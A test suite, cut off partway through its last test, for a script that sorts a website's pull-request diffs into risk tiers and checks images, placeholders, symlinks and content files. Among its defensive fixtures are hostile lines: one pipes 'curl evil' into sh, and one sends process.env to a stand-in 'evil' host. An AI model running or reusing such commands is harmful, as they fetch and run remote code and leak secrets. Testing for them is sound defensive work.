// Tests for scripts/check-change-scope.mjs. Fake diffs only: no git repository, no network. Run with:
//   node --test scripts/check-change-scope.test.mjs   (or `npm run test:scripts`)
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { test } from "node:test";
import { rules } from "./change-scope-rules.mjs";
import { brandFiles } from "./config-rules.mjs";
import { siteConfig } from "../site.config.ts";
import { ITEM_DIR } from "../src/collections/schema.ts";
import { SETTINGS_NAMES } from "../src/collections/site-validate.ts";
import { FORM_DIR } from "../src/forms/schema.ts";
import { REGISTRY_PATH, registrySource } from "../src/forms/registry.ts";
import { SECRET, app1Exif, jpeg as makeJpeg, png as makePng, pngText, webp as makeWebp } from "./image-fixtures.mjs";
import {
  decide,
  evaluateChange,
  fence,
  formatReport,
  gatherChange,
  gitIn,
  main,
  parseArgs,
  parseHunkLines,
  parseRawDiff,
  safe,
} from "./check-change-scope.mjs";

// Content, routes and nav files are parsed, so a test file needs real (plain data) content unless it says otherwise.
const file = (path, status = "M", extra = {}) => ({
  path,
  status,
  added: [],
  removed: [],
  ...(rules.pageFile.test(path) || path.startsWith("public/images/") ? {} : { content: "export const x = 1;\n" }),
  ...extra,
});
const run = (files) => evaluateChange({ files }, rules);

const jpg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46, 0x49, 0x46, 0, 1]);
const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13]);
const webp = Buffer.concat([Buffer.from("RIFF"), Buffer.from([1, 2, 3, 4]), Buffer.from("WEBP")]);
const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>');
const image = (path, head, size = 1000) => file(path, "A", { head, size });

// ---- tier 1 and tier 3 ----------------------------------------------------------------------------------------

test("a change to page files, content modules, images and nav is tier 1", () => {
  const result = run([
    file("src/content/pages/about.json"),
    file("src/content/pages/our-team.json", "A"),
    file("src/content/pages/home.json"),
    file("src/content/video.ts"),
    file("src/content/nav.ts"),
    image("public/images/team/photo.jpg", jpg),
  ]);
  assert.equal(result.tier, 1);
  assert.deepEqual(result.outside, []);
});

const tier3 = [
  ["worker/contact.ts", "contact form"],
  ["worker/config.ts", "contact form"],
  ["public/_headers", "security headers"],
  ["public/_redirects", "redirect"],
  ["wrangler.jsonc", "deploy"],
  ["site.config.ts", "site settings"],
  ["package.json", "package"],
  ["package-lock.json", "package"],
  [".github/workflows/ci.yml", "workflow"],
  [".claude/settings.json", "Claude"],
  ["src/components/hl/Button.tsx", "shared component"],
  ["src/content/site.ts", "wiring"],
  ["src/content/contact.ts", "wiring"],
  ["src/content/providers.ts", "wiring"],
  ["src/content/auto-reply.ts", "wiring"],
  ["src/content/contact-fields.ts", "wiring"],
  ["src/content/deep/nested.ts", "allow-list"],
  ["src/content/pages/team/about.json", "not a page file"],
  ["src/content/pages/about.draft.json", "not a page file"],
  ["src/content/pages/About.json", "not a page file"],
  ["src/content/pages/about.ts", "not a page file"],
  ["src/app/layout.tsx", "allow-list"],
  ["src/app/(site)/layout.tsx", "allow-list"],
  ["src/app/(site)/about/page.tsx", "allow-list"],
  ["src/app/(site)/[slug]/page.tsx", "allow-list"],
  ["src/app/(site)/faq/page.tsx", "allow-list"],
  ["src/lib/metadata.ts", "site code"],
  ["src/lib/routes.ts", "site code"],
  ["src/blocks/library/hero/Hero.tsx", "block's design"],
  ["src/blocks/definitions.ts", "block's design"],
  ["src/site-blocks/definitions.ts", "block's design"],
  ["scripts/preview.mjs", "allow-list"],
  ["docs/STATUS.md", "allow-list"],
  ["public/brand/logo.svg", "allow-list"],
  ["README.md", "allow-list"],
];
for (const [path, hint] of tier3) {
  test(`${path} is tier 3`, () => {
    const result = run([file("src/content/home.ts"), file(path)]);
    assert.equal(result.tier, 3);
    assert.deepEqual(result.outside.map((o) => o.path), [path]);
    assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
  });
}

test("an empty change is tier 1", () => {
  assert.equal(run([]).tier, 1);
});

test("deleting or renaming a page file is tier 3: archive the page instead", () => {
  const result = run([file("src/content/pages/about.json", "D")]);
  assert.equal(result.tier, 3);
  assert.equal(result.outside[0].reason, 'pages are archived, not deleted: set its status to "archived" instead');
  // A rename shows as a delete plus an add (the diff uses --no-renames): the delete alone makes it tier 3.
  const renamed = run([file("src/content/pages/about.json", "D"), file("src/content/pages/about-us.json", "A")]);
  assert.equal(renamed.tier, 3);
  assert.deepEqual(renamed.outside.map((o) => o.path), ["src/content/pages/about.json"]);
});

test("deleting a content module or an image stays tier 1", () => {
  assert.equal(run([file("src/content/video.ts", "D"), file("public/images/a.jpg", "D")]).tier, 1);
});

// ---- images ---------------------------------------------------------------------------------------------------

test("jpg, png and webp images with matching bytes under 500 KB pass", () => {
  const result = run([image("public/images/a.jpg", jpg), image("public/images/b.JPEG", jpg), image("public/images/c.png", png), image("public/images/d/e.webp", webp)]);
  assert.deepEqual(result.imageProblems, []);
});

test("other formats fail, SVG included", () => {
  for (const path of ["public/images/a.svg", "public/images/a.gif", "public/images/a.avif", "public/images/a"]) {
    const result = run([image(path, svg)]);
    assert.equal(result.imageProblems.length, 1, path);
    assert.equal(result.imageProblems[0].path, path);
  }
  assert.match(run([image("public/images/a.svg", svg)]).imageProblems[0].reason, /SVG/);
});

test("a file whose bytes do not match its extension fails (an SVG renamed to .png)", () => {
  assert.equal(run([image("public/images/a.png", svg)]).imageProblems.length, 1);
  assert.equal(run([image("public/images/a.jpg", png)]).imageProblems.length, 1);
  assert.equal(run([image("public/images/a.webp", jpg)]).imageProblems.length, 1);
});

test("the size limit is 500 KB (512,000 bytes)", () => {
  assert.equal(run([image("public/images/a.jpg", jpg, 512000)]).imageProblems.length, 0);
  assert.equal(run([image("public/images/a.jpg", jpg, 512001)]).imageProblems.length, 1);
});

test("deleted images and files outside public/images are not checked by the image rules", () => {
  assert.deepEqual(run([file("public/images/a.svg", "D")]).imageProblems, []);
  assert.deepEqual(run([image("public/brand/logo.svg", svg)]).imageProblems, []);
});

// ---- placeholders ---------------------------------------------------------------------------------------------

test("a new [[placeholder]] in content or app files is reported", () => {
  const result = run([
    file("src/content/home.ts", "M", { added: ['phone: "[[Phone number]]"'] }),
    file("src/app/(site)/faq/page.tsx", "M", { added: ["<p>[[TBD]]</p>"] }),
  ]);
  assert.deepEqual(result.placeholders.map((p) => p.text), ["[[Phone number]]", "[[TBD]]"]);
});

test("a new [[placeholder]] in a page file is reported, and one that was already on an edited line is not", () => {
  const added = run([file("src/content/pages/about.json", "M", { added: ['  "title": "[[About title]]",'] })]);
  assert.deepEqual(added.placeholders.map((p) => [p.path, p.text]), [["src/content/pages/about.json", "[[About title]]"]]);
  assert.equal(decide(added, "strict").ok, false);
  assert.deepEqual(decide(added, "strict").reasons, ["leftover [[placeholder]] text"]);
  assert.equal(decide(added, "report-only").ok, true);
  const edited = run([file("src/content/pages/about.json", "M", { removed: ['  "title": "[[About title]]",'], added: ['  "title": "[[About title]] and more",'] })]);
  assert.deepEqual(edited.placeholders, []);
});

test("removed placeholder lines and other folders are not reported", () => {
  const result = run([
    file("src/content/home.ts", "M", { removed: ['phone: "[[Phone number]]"'] }),
    file("worker/contact.ts", "M", { added: ["// [[note]]"] }),
    file("docs/STATUS.md", "M", { added: ["[[x]]"] }),
    file("src/app/hl.css", "M", { added: ["/* [[x]] */"] }),
  ]);
  assert.deepEqual(result.placeholders, []);
});

// ---- the decision ---------------------------------------------------------------------------------------------

test("strict mode fails on tier 3, bad images and new placeholders, and passes on a plain content change", () => {
  assert.equal(decide(run([file("worker/contact.ts")]), "strict").ok, false);
  assert.equal(decide(run([image("public/images/a.svg", svg)]), "strict").ok, false);
  assert.equal(decide(run([file("src/content/home.ts", "M", { added: ["[[x]]"] })]), "strict").ok, false);
  assert.equal(decide(run([file("src/content/home.ts", "M", { added: ['"$9"'] })]), "strict").ok, true);
  assert.equal(decide(run([file("src/content/home.ts")]), "strict").ok, true);
});

test("report-only mode never fails", () => {
  assert.equal(decide(run([file("worker/contact.ts"), image("public/images/a.svg", svg)]), "report-only").ok, true);
});

// ---- plain-English output -------------------------------------------------------------------------------------

test("the report says in plain English what happened", () => {
  const ok = formatReport(run([file("src/content/home.ts", "M", { added: ['"$900"'] })]), { mode: "strict" });
  assert.match(ok, /Tier 1/);
  assert.doesNotMatch(ok, /Flagged for Grant/);
  assert.match(ok, /PASS/);
  const bad = formatReport(run([file("worker/contact.ts"), image("public/images/a.svg", svg), file("src/content/home.ts", "M", { added: ["[[x]]"] })]), { mode: "strict" });
  assert.match(bad, /Tier 3/);
  assert.match(bad, /worker\/contact\.ts/);
  assert.match(bad, /public\/images\/a\.svg/);
  assert.match(bad, /\[\[x\]\]/);
  assert.match(bad, /FAIL/);
  assert.match(formatReport(run([file("worker/contact.ts")]), { mode: "report-only" }), /report only/i);
});

// ---- parsing git output ---------------------------------------------------------------------------------------

const rawEntry = (status, path, oldMode = "100644", newMode = "100644") => `:${oldMode} ${newMode} 1111111 2222222 ${status}\0${path}\0`;

test("parseRawDiff reads git's NUL-separated raw output, keeping odd paths and the modes intact", () => {
  const raw = rawEntry("M", "src/content/home.ts") + rawEntry("A", "src/app/(site)/faq/page.tsx", "000000") + rawEntry("D", "old file.txt", "100644", "000000") + rawEntry("T", "src/content/link.ts", "100644", "120000");
  assert.deepEqual(parseRawDiff(raw), [
    { status: "M", path: "src/content/home.ts", oldMode: "100644", newMode: "100644" },
    { status: "A", path: "src/app/(site)/faq/page.tsx", oldMode: "000000", newMode: "100644" },
    { status: "D", path: "old file.txt", oldMode: "100644", newMode: "000000" },
    { status: "T", path: "src/content/link.ts", oldMode: "100644", newMode: "120000" },
  ]);
  assert.deepEqual(parseRawDiff(""), []);
});

test("parseHunkLines ignores diff headers, even when a changed line starts with +++ or ---", () => {
  const patch = [
    "diff --git a/x.ts b/x.ts",
    "index 111..222 100644",
    "--- a/x.ts",
    "+++ b/x.ts",
    "@@ -1,2 +1,2 @@",
    "-old line",
    "+++ new line that starts with plus signs",
    "--- dashes inside the hunk",
    "+new line",
    "\\ No newline at end of file",
    "@@ -9 +9 @@",
    "+later",
  ].join("\n");
  assert.deepEqual(parseHunkLines(patch), {
    added: ["++ new line that starts with plus signs", "new line", "later"],
    removed: ["old line", "-- dashes inside the hunk"],
  });
});

// ---- command line ---------------------------------------------------------------------------------------------

test("parseArgs: defaults, explicit refs and modes", () => {
  assert.deepEqual(parseArgs([], {}), { base: "origin/main", head: "HEAD", mode: "strict" });
  assert.deepEqual(parseArgs(["--base", "main", "--head", "feature", "--report-only"], {}), { base: "main", head: "feature", mode: "report-only" });
  assert.equal(parseArgs(["--strict"], {}).mode, "strict");
});

test("parseArgs --ci reads GitHub's own variables: strict only on change/ branches", () => {
  assert.deepEqual(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "change/opening-hours" }), { base: "origin/main", head: "HEAD", mode: "strict" });
  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "feat/x" }).mode, "report-only");
  assert.match(parseArgs(["--ci"], {}).skip, /not a pull request/i);
});

test("parseArgs --ci treats change/ in any capitalisation as a change branch", () => {
  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "Change/Opening-Hours" }).mode, "strict");
  assert.equal(parseArgs(["--ci"], { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "exchange/x" }).mode, "report-only");
});

test("parseArgs --ci is strict for a pull request opened by the editor's bot, whatever the branch", () => {
  const dir = mkdtempSync(join(tmpdir(), "scope-event-"));
  try {
    const eventFor = (login) => {
      const path = join(dir, `${login}.json`);
      writeFileSync(path, JSON.stringify({ pull_request: { user: { login } } }));
      return { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "editor/hours", GITHUB_EVENT_PATH: path };
    };
    assert.equal(parseArgs(["--ci"], eventFor("site-editor[bot]"), "site-editor[bot]").mode, "strict");
    assert.equal(parseArgs(["--ci"], eventFor("someone-else"), "site-editor[bot]").mode, "report-only");
    assert.equal(parseArgs(["--ci"], eventFor("site-editor[bot]"), null).mode, "report-only");
    assert.equal(parseArgs(["--ci"], eventFor(""), "").mode, "report-only");
    const missing = { GITHUB_BASE_REF: "main", GITHUB_HEAD_REF: "x", GITHUB_EVENT_PATH: join(dir, "nope.json") };
    assert.equal(parseArgs(["--ci"], missing, "site-editor[bot]").mode, "report-only");
    writeFileSync(join(dir, "bad.json"), "{");
    assert.equal(parseArgs(["--ci"], { ...missing, GITHUB_EVENT_PATH: join(dir, "bad.json") }, "site-editor[bot]").mode, "report-only");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("parseArgs rejects unknown flags, missing values and refs that look like options", () => {
  assert.match(parseArgs(["--nope"], {}).error, /--nope/);
  assert.match(parseArgs(["--base"], {}).error, /--base/);
  assert.match(parseArgs(["--base", "--head"], {}).error, /--base/);
  assert.match(parseArgs(["--head", "-Ofoo"], {}).error, /--head/);
});

// ---- the git layer, with a fake git ---------------------------------------------------------------------------

/** A table of git calls and their output. A value of null means "git exited with status 1" (what `git grep` does for no match). */
function fakeGit(table) {
  return (args) => {
    const key = args.join(" ");
    if (!(key in table)) throw new Error(`unexpected git call: ${key}`);
    if (table[key] === null) throw Object.assign(new Error("git exited with status 1"), { status: 1 });
    return Buffer.from(table[key]);
  };
}

const RANGE = "origin/main...HEAD";
const cleanJpeg = makeJpeg();
const HOME_WITH_IMAGE = 'export const title = "From $900";\nexport const hero = { src: "/images/new.jpg", alt: "The front desk at opening time" };\n';
const grepKey = (url) => `grep -l -I -F -z -e ${url} HEAD -- src`;
const scenario = () => ({
  "merge-base origin/main HEAD": "abc123\n",
  [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "src/content/home.ts") + rawEntry("A", "public/images/new.jpg", "000000"),
  [`diff -U0 --no-renames --text ${RANGE} -- src/content/home.ts`]: '@@ -1 +1 @@\n-title: "Old"\n+title: "From $900"\n',
  "show HEAD:src/content/home.ts": HOME_WITH_IMAGE,
  "show HEAD:public/images/new.jpg": cleanJpeg,
  [grepKey("/images/new.jpg")]: "HEAD:src/content/home.ts\0",
});

test("gatherChange builds the change from git output and evaluateChange sorts it", () => {
  const change = gatherChange({ base: "origin/main", head: "HEAD", git: fakeGit(scenario()) });
  assert.deepEqual(change.files.map((f) => [f.status, f.path]), [
    ["M", "src/content/home.ts"],
    ["A", "public/images/new.jpg"],
  ]);
  assert.deepEqual(change.files[0].added, ['title: "From $900"']);
  assert.equal(change.files[1].size, cleanJpeg.length);
  const result = evaluateChange(change, rules);
  assert.equal(result.tier, 1);
  assert.deepEqual(result.contentProblems, []);
  assert.equal(change.pages, undefined, "no page file changed, so the pages are not read");
});

test("main prints the report and sets the exit code for the mode", () => {
  const out = [];
  const env = {};
  assert.equal(main({ argv: [], env, git: fakeGit(scenario()), out: (t) => out.push(t) }), 0);
  assert.match(out.join("\n"), /Tier 1/);

  const bad = { ...scenario(), [`diff --raw -z --no-renames ${RANGE}`]: rawEntry("M", "worker/contact.ts"), [`diff -U0 --no-renames --text ${RANGE} -- worker/contact.ts`]: "" };
  assert.equal(main({ argv: [], env, git: fakeGit(bad), out: () => {} }), 1);
  assert.equal(main({ argv: ["--report-only"], env, git: fakeGit(bad), out: () => {} }), 0);
});

test("main exits 2 on bad flags, 0 with a note outside a pull request, and 2 if git fails", () => {
  const out = [];
  assert.equal(main({ argv: ["--nope"], env: {}, git: fakeGit({}), out: (t) => out.push(t) }), 2);
  assert.equal(main({ argv: ["--ci"], env: {}, git: fakeGit({}), out: (t) => out.push(t) }), 0);
  assert.match(out.join("\n"), /not a pull request/i);
  assert.equal(main({ argv: [], env: {}, git: fakeGit({}), out: (t) => out.push(t) }), 2);
});

test("main appends the report to the GitHub job summary when one is set", () => {
  const dir = mkdtempSync(join(tmpdir(), "scope-"));
  try {
    const summary = join(dir, "summary.md");
    main({ argv: [], env: { GITHUB_STEP_SUMMARY: summary }, git: fakeGit(scenario()), out: () => {} });
    assert.match(readFileSync(summary, "utf8"), /Tier 1/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ---- review findings: tier 1 .ts files are code (C1) ----------------------------------------------------------

const codeInContent = [
  ["a call at the top level", 'import { execSync } from "node:child_process";\nexecSync("curl evil | sh");\n', "node:child_process"],
  ["a fetch call", 'fetch("https://evil/" + JSON.stringify(process.env));\n', "ExpressionStatement"],
  ["require", 'export const a = require("child_process");\n', "CallExpression"],
  ["process.env", "export const a = process.env.KEY;\n", "process"],
  ["a function value", "export const a = () => 1;\n", "ArrowFunction"],
  ["a template with a substitution", "export const a = `${x}`;\n", "TemplateExpression"],
  ["a function declaration", "export function f() {}\n", "FunctionDeclaration"],
  ["a default export", "export default { a: 1 };\n", "ExportAssignment"],
  ["a let variable", "let a = 1;\n", "const"],
  ["a method call", "export const a = [1].map((x) => x);\n", "CallExpression"],
  ["an import from a package", 'import evil from "evil";\nexport const a = 1;\n', "evil"],
  ["an import from the worker", 'import { x } from "../../worker/contact";\nexport const a = 1;\n', "worker/contact"],
  ["an import of a wiring module", 'import { providers } from "./providers";\nexport const a = 1;\n', "./providers"],
  ["a re-export", 'export * from "../../worker/contact";\n', "re-exports"],
  ["globalThis", "export const a = globalThis;\n", "globalThis"],
  ["destructuring", "export const { a } = obj;\n", "destructuring"],
  ["constructor access", "export const a = x.constructor;\n", "constructor"],
  ["an operator other than +", "export const a = 1 * 2;\n", "operator"],
  ["a class", "class A {}\n", "ClassDeclaration"],
  ["a NUL byte", 'export const a = "x";\0\n', "NUL"],
  ["a getter", "export const a = { get x() { return 1; } };\n", "method or accessor"],
];
for (const path of ["src/content/home.ts", "src/content/nav.ts"]) {
  for (const [name, content, hint] of codeInContent) {
    test(`${path} with ${name} is tier 3`, () => {
      const result = run([file(path, "M", { content })]);
      assert.equal(result.tier, 3);
      assert.ok(result.outside[0].reason.includes(hint), `reason "${result.outside[0].reason}" should mention "${hint}"`);
    });
  }
}

test("plain data in a content file is tier 1", () => {
  const data = `// Comments are fine.
import type { Need } from "anything";
import { type Other } from "anything";
import { needOptions } from "./nav";
import { more } from "@/content/home";

export type Item = { label: string; href: string };
export interface Shape { a: number }
export const hero = { eyebrow: "Hi", n: -1, list: [1, "two", true, null], nested: { a: [{ b: "c" }] } } as const;
export const typed: readonly Item[] = [{ label: "A", href: "/a" }] satisfies readonly Item[];
export const joined = "a" + "b";
export const copy = { ...hero, extra: needOptions };
export const ref = hero.eyebrow;
export const tpl = \`plain text\`;
export { hero as alias };
`;
  assert.equal(run([file("src/content/home.ts", "M", { content: data })]).tier, 1);
});

test("a file that could not be read is tier 3, and deleting nav.ts is tier 3", () => {
  assert.equal(run([file("src/content/home.ts", "M", { content: undefined })]).tier, 3);
  assert.equal(run([file("src/content/nav.ts", "D")]).tier, 3);
  assert.equal(run([file("src/content/home.ts", "D")]).tier, 1);
});

test("a content file can still use call, bind or join as ordinary data keys, but not read them as methods", () => {
  assert.equal(run([file("src/content/home.ts", "M", { content: 'export const cta = { call: "Book a call", join: "Join", slice: "x" };\n' })]).tier, 1);
  assert.equal(run([file("src/content/home.ts", "M", { content: "export const a = b.call;\n" })]).tier, 3);
});

test("content files with await using, using, a syntax error, a computed key or a raw-HTML key are tier 3; a stray ; is fine", () => {
  for (const content of [
    "export await using a = x;\n",
    "using a = x;\n",
    "export const a = ;\n",
    'export const a = { ["x" + "y"]: 1 };\n',
    "export const a = { dangerouslySetInnerHTML: { __html: 'x' } };\n",
    "export const a = { __proto__: b };\n",
  ]) {
    assert.equal(run([file("src/content/home.ts", "M", { content })]).tier, 3, content);
  }
  assert.equal(run([file("src/content/home.ts", "M", { content: "export const a = 1;;\n" })]).tier, 1);
});

// ---- review findings: symlinks, submodules, type changes (I2) -------------------------------------------------

test("symlinks, submodules and file type changes are tier 3 even at tier 1 paths", () => {
  for (const path of ["src/content/link.ts", "src/content/pages/about.json", "src/content/nav.ts", "public/images/a.png"]) {
    for (const mode of ["120000", "160000"]) {
      const result = run([file(path, "A", { mode, head: png, size: 10 })]);
      assert.equal(result.tier, 3, `${path} ${mode}`);
      assert.match(result.outside[0].reason, /symbolic links/);
    }
  }
  assert.equal(run([file("src/content/home.ts", "T", { mode: "120000" })]).tier, 3);
  assert.equal(run([file("src/content/home.ts", "T", { mode: "100644" })]).tier, 3);
  assert.equal(run([file("src/content/home.ts", "D", { mode: "000000" })]).tier, 1);
});

test("*.test.ts and *.d.ts under src/content are not copy", () => {
  assert.equal(run([file("src/content/home.test.ts")]).tier, 3);
  assert.equal(run([file("src/content/types.d.ts")]).tier, 3);
});

// ---- the cheap minor fixes ------------------------------------------------------------------------------------

test("a placeholder that was already on an edited line is not new; a genuinely new one is", () => {
  const edit = (removed, added) => run([file("src/content/home.ts", "M", { removed, added })]).placeholders.map((p) => p.text);
  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[A]] and more"']), []);
  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[B]]"']), ["[[B]]"]);
  assert.deepEqual(edit(['title: "[[A]]"'], ['title: "[[A]]"', 'other: "[[A]]"']), ["[[A]]"]);
  assert.deepEqual(edit([], ['x: "[[A]]"']), ["[[A]]"]);
});

test("an image with HTML or SVG markup inside fails even when its first bytes are right", () => {
  const result = run([image("public/images/a.jpg", jpg, 100)].map((f) => ({ ...f, hasMarkup: true })));
  assert.equal(result.imageProblems.length, 1);
  assert.match(result.imageProblems[0].reason, /markup/);
});

test("crafted file names and lines cannot forge output lines or break a code fence", () => {
  // The newline, carriage return and NUL each become one "?"; everything else is kept.
  assert.equal(safe("a\n::error::x\r\u0000"), "a?::error::x??");
  const result = run([file("src/content/a\n::error::boom.ts"), file("src/content/home.ts", "M", { added: ['x: "$1 ``` \u001b[31m"'] })]);
  const report = formatReport(result, { mode: "strict" });
  assert.ok(!report.split("\n").some((line) => line.startsWith("::")), "no line may start with ::");
  assert.ok(!report.includes("\u001b"));
  const fenced = fence("one ``` two ````` three");
  assert.ok(fenced.startsWith("``````text\n") && fenced.endsWith("\n``````"));
});

// ---- the git layer against a real repository (I1, I2) ---------------------------------------------------------

/** A small page that passes the content check: a hero first, a closing call to action last. */
const pageData = (path, extra = {}) => ({
  path,
  title: "A page title",
  description: "A short description of the page for search results.",
  status: "live",
  blocks: [
    { type: "hero", content: { title: "A headline for the page", intro: "One sentence that says what the page is about." } },
    { type: "closing-cta", content: { heading: "Ready when you are", action: { label: "Book a call", href: "@booking" } } },
  ],
  ...extra,
});
const pageText = (path, extra) => `${JSON.stringify(pageData(path, extra), null, 2)}\n`;

function makeRepo(setup) {
  const dir = mkdtempSync(join(tmpdir(), "scope-repo-"));
  const git = gitIn(dir);
  const commit = (message) => git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", message]);
  const write = (path, content) => {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), content);
  };
  git(["init", "-q", "-b", "main"]);
  write("src/content/home.ts", 'export const title = "Old";\n');
  write("src/components/hl/Container.tsx", "export function Container() { return null; }\n");
  write("src/content/pages/home.json", pageText("/"));
  write("src/content/pages/contact.json", pageText("/contact"));
  write("src/content/pages/about.json", pageText("/about", { menu: { label: "About", order: 20, places: ["header"] } }));
  for (const name of ["business", "brand", "notice"]) write(`src/content/${name}.json`, readFileSync(new URL(`../src/content/${name}.json`, import.meta.url)));
  git(["add", "-A"]);
  commit("base");
  git(["checkout", "-q", "-b", "change/test"]);
  setup({ dir, git, write });
  git(["add", "-A"]);
  commit("change");
  return { dir, git };
}

const inRepo = (setup, argv = ["--base", "main", "--head", "HEAD"]) => {
  const { dir, git } = makeRepo(setup);
  try {
    const out = [];
    const code = main({ argv, env: {}, git, out: (t) => out.push(t) });
    return { code, report: out.join("\n") };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
};

test("real git: a clean content edit passes", () => {
  const { code, report } = inRepo(({ write }) => write("src/content/home.ts", 'export const title = "New";\n'));
  assert.equal(code, 0, report);
  assert.match(report, /Tier 1/);
});

test("real git: a NUL byte cannot hide added code from the check", () => {
  const { code, report } = inRepo(({ write }) =>
    write("src/content/home.ts", Buffer.from('export const title = "x";\0\nimport { execSync } from "node:child_process";\n// [[todo]] $900 a@b.com\n')),
  );
  assert.equal(code, 1, report);
  assert.match(report, /Tier 3/);
  assert.match(report, /\[\[todo\]\]/);
});

test("real git: a symlink at a content path is tier 3", () => {
  const { code, report } = inRepo(({ dir }) => symlinkSync("../../worker/contact.ts", join(dir, "src/content/link.ts")));
  assert.equal(code, 1, report);
  assert.match(report, /symbolic links/);
});

test("real git: a file turned into a symlink is tier 3", () => {
  const { code, report } = inRepo(({ dir }) => {
    rmSync(join(dir, "src/content/home.ts"));
    symlinkSync("../../worker/contact.ts", join(dir, "src/content/home.ts"));
  });
  assert.equal(code, 1, report);
  assert.match(report, /symbolic links/);
});

test("real git: a submodule (gitlink) at a content path is tier 3 and does not crash the check", () => {
  const { code, report } = inRepo(({ dir }) => {
    const nested = join(dir, "src/content/sub.ts");
    mkdirSync(nested, { recursive: true });
    writeFileSync(join(nested, "a.txt"), "x");
    const inner = gitIn(nested);
    inner(["init", "-q", "-b", "main"]);
    inner(["add", "-A"]);
    inner(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "inner"]);
  });
  assert.equal(code, 1, report);
  assert.match(report, /submodules/);
});

test("real git: code added to a content file, a bad image and a new app file all fail", () => {
  const png8 = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  const { code, report } = inRepo(({ write }) => {
    write("src/content/home.ts", 'fetch("https://evil");\nexport const title = "x";\n');
    write("public/images/a.png", Buffer.concat([png8, Buffer.from("<script>alert(1)</script>")]));
    write("src/app/(site)/faq/page.tsx", "export default function P() { return null; }\n");
  });
  assert.equal(code, 1, report);
  assert.match(report, /src\/content\/home\.ts/);
  assert.match(report, /markup/);
  assert.match(report, /src\/app\/\(site\)\/faq\/page\.tsx/);
});

test("real git: report-only never fails", () => {
  const bad = inRepo(({ write }) => write("worker/contact.ts", "x"), ["--base", "main", "--head", "HEAD", "--report-only"]);
  assert.equal(bad.code, 0);
});

// ---- pages as data: the content check at the head commit ------------------------------------------------------

test("real git: a branch that only edits the text of a page file is tier 1 and passes in strict mode", () => {
  const { code, report } = inRepo(({ write }) =>
    write("src/content/pages/about.json", pageText("/about", { title: "About the studio", menu: { label: "About", order: 20, places: ["header"] } })),
  );
  assert.equal(code, 0, report);
  assert.match(report, /Tier 1/);
  assert.match(report, /PASS/);
});

test("real git: a new page with a valid hero and closing call to action is tier 1 and passes in strict mode", () => {
  const { code, report } = inRepo(({ write }) => write("src/content/pages/our-team.json", pageText("/our-team")));
  assert.equal(code, 0, report);
  assert.match(report, /Tier 1/);
  assert.doesNotMatch(report, /Content problems/);
});

test("real git: a page that links to a page that does not exist fails with a plain message", () => {
  const broken = pageData("/about", {
    blocks: [
      { type: "hero", content: { title: "A headline for the page", action: { label: "Read more", href: "/missing" } } },
      { type: "closing-cta", content: { heading: "Ready when you are", action: { label: "Book a call", href: "@booking" } } },
    ],
  });
  const { code, report } = inRepo(({ write }) => write("src/content/pages/about.json", JSON.stringify(broken, null, 2)));
  assert.equal(code, 1, report);
  assert.match(report, /Content problems in the page files/);
  assert.match(report, /about\.json, block 1 \(hero\)/);
  assert.match(report, /points to \/missing, which is not a page on this site/);
  assert.match(report, /FAIL \(content problem\)/);
});

test("real git: deleting a picture a page still uses fails, even when no page file changed", () => {
  const withPoster = pageData("/about", {
    blocks: [
      { type: "hero", content: { title: "A headline for the page" } },
      { type: "video", content: { url: "https://www.youtube.com/watch?v=aqz-KE-bpKQ", title: "A short tour of the studio", poster: { src: "/images/studio.jpg", alt: "The studio front desk" } } },
      { type: "closing-cta", content: { heading: "Ready when you are", action: { label: "Book a call", href: "@booking" } } },
    ],
  });
  const { dir, git } = makeRepo(({ write }) => {
    write("public/images/studio.jpg", makeJpeg());
    write("src/content/pages/about.json", JSON.stringify(withPoster, null, 2));
  });
  try {
    git(["checkout", "-q", "-b", "change/remove-photo"]);
    rmSync(join(dir, "public/images/studio.jpg"));
    git(["add", "-A"]);
    git(["-c", "user.email=t@example.com", "-c", "user.name=Test", "-c", "commit.gpgsign=false", "commit", "-q", "-m", "remove"]);
    const out = [];
    assert.equal(main({ argv: ["--base", "change/test", "--head", "HEAD"], env: {}, git, out: (t) => out.push(t) }), 1, out.join("\n"));
    assert.match(out.join("\n"), /about\.json, block 2 \(video\)/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("real git: a page file that is not valid JSON fails and names the file, never a stack trace", () => {
  const { code, report } = inRepo(({ write }) => write("src/content/pages/about.json", '{ "path": "/about", }\n'));
  assert.equal(code, 1, report);
  assert.match(report, /about\.json: is not valid JSON/);
  assert.doesNotMatch(report, /\n\s+at /);
});

test("real git: a page picture must exist, and a picture used in a page file needs real alt text", () => {
  const withPoster = (poster) =>
    pageData("/about", {
      blocks: [
        { type: "hero", content: { title: "A headline for the page" } },
        { type: "video", content: { url: "https://www.youtube.com/watch?v=aqz-KE-bpKQ", title: "A short tour of the studio", poster } },
        { type: "closing-cta", content: { heading: "Ready when you are", action: { label: "Book a call", href: "@booking" } } },
      ],
    });
  const page = (poster) => JSON.stringify(withPoster(poster), null, 2);
